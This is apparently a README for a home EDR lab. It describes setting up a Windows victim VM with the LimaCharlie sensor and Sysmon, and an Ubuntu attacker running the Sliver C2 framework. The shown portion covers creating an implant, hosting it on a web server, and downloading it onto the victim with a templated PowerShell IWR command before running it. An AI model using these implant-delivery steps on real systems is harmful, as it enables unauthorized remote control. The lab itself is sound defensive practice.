# LimaCharlie-EDR-Lab
![Architecture](https://i.imgur.com/6mftsEk.jpg)

## Introduction

I simulated a real-life cyber attack scenario and tested the effectiveness of my security measures. I created two virtual machines on a NatNetwork: an Ubuntu Server acting as the attacker, and a Windows 11 machine as the victim.

To enhance the security of the victim machine, I installed LimaCharlie sensor and Sysmon, which helped me detect any potential attacks or security events. On the Ubuntu Server, I installed Silver C2, a command and control attack tool for Windows machines.

To test my security measures, I executed the C2 attack and created detection rules to alert administrators of any suspicious activity. This lab project aimed to demonstrate the importance of having robust security measures in place to protect against cyber attacks.


The architecture of the project consists of the following components:


- Virtual Box NatNetwork
- Virtual Machines (1 windows, 1 linux)
- LimaCharlieEDR
- Silver C2 Server

## Labbing

After environment is set up I created a implant on the Ubuntu server to install on to the Windows System

![Implant](https://i.imgur.com/LEP0qSk.png)

Next I created quick websever on the Ubuntu machine for the C2 Payload to be installed from, then I ran this command on the Windows device.

![IWR](https://i.imgur.com/dadsDeX.png)

Commad: IWR -Uri http://[IpAddress]/[ImplantName] -Outfile [FileLocation]

After downloading the implant we need to run the malicious file 

[Excute](https://i.imgur.com/mkdYQkp.png)

